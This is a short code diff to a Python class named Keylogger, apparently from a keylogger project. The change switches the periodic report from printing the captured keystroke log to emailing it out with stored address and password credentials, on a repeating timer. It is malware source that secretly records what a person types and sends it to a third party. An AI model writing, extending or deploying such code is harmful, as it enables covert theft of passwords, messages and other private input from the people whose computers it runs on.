@@ -61,8 +61,9 @@ class Keylogger:
         """
         if self.log:
             # if there is something in log, report it
-            # self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            print(self.log)
+            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            # can print to a file, whatever you want
+            # print(self.log)
         self.log = ""
         Timer(interval=self.interval, function=self.report).start()
 
